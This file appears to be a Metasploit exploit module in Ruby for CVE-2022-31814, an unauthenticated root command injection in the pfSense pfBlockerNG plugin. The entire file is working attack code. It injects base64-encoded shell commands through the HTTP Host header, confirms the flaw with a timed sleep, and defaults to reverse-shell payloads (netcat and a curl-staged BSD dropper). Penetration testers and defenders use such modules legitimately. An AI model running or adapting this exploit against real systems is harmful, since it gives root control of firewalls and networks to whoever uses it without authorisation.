##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/stopwatch'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'pfSense pfBlockerNG unauthenticated RCE',
        'Description' => %q{
          This module exploits an unauthenticated Remote Command Execution as root
          in the pfSense pfBlockerNG plugin (CVE-2022-31814).
          The vulnerability affects versions of pfBlockerNG <= 2.1.4_26 and can be exploited
          by an un authenticated user gaining root access.

          pfBlockerNG is a pfSense plugin that is NOT installed by default and it’s generally
          used to block inbound connections from whole countries or IP ranges.

          This module uses the vulnerability to upload and execute payloads with root privileges.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'IHTeam', # vulnerability discovery
          'h00die-gr3y' # metasploit module
        ],
        'References' => [
          ['CVE', '2022-31814'],
          ['PACKETSTORM', '168484'],
          ['URL', 'https://www.ihteam.net/advisory/pfblockerng-unauth-rce-vulnerability/'],
          ['URL', 'https://docs.netgate.com/pfsense/en/latest/packages/pfblocker.html']
        ],
        'DisclosureDate' => '2022-09-05',
        'Platform' => ['unix', 'bsd'],
        'Arch' => [ARCH_CMD, ARCH_X64],
        'Privileged' => true,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_netcat'
              }
            }
          ],
          [
            'BSD Dropper',
            {
              'Platform' => 'bsd',
              'Arch' => [ARCH_X64],
              'Type' => :bsd_dropper,
              'CmdStagerFlavor' => [ 'curl' ],
              'DefaultOptions' => {
                'PAYLOAD' => 'bsd/x64/shell_reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 1,
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
  end

  def execute_command(cmd, _opts = {})
    begin 
      b64 = Rex::Text.encode_base64(cmd)
      payload = "\' * ; echo #{b64} | python3.8 -m base64 -d | sh ; \'"

      return send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'pfblockerng', 'www', 'index.php'),
       'vhost' => payload
      })
      rescue StandardError => e
        elog("#{peer} - Communication error occurred: #{e.message}", error: e)
        return Exploit::CheckCode::Unknown("Communication error occurred: #{e.message}")
    end
  end
  
  # Checking if pfBlockerNG plugin is installed and execute a randomized sleep to test
  # the remote code execution
  def check
    print_status("Checking if #{peer} can be exploited!")
    sleep_time = rand(5..10)
    print_status("Performing command injection test issuing a sleep command of #{sleep_time} seconds.")
    res, elapsed_time = Rex::Stopwatch.elapsed_time do
      execute_command("sleep #{sleep_time}")
    end
    
    return Exploit::CheckCode::Unknown('No response received from the target!') unless res
    print_status("Elapsed time: #{elapsed_time} seconds.")
    return CheckCode::Safe('Failed to test command injection.') unless elapsed_time >= sleep_time
    CheckCode::Vulnerable('Successfully tested command injection.')
  end

  def exploit
    case target['Type']
    when :unix_cmd
      print_status("Executing unix_cmd with #{payload.encoded} for #{target.name}")
      execute_command(payload.encoded)
    when :bsd_dropper
      print_status("Executing bsd_dropper for #{target.name}")
      execute_cmdstager
    end
  end
end
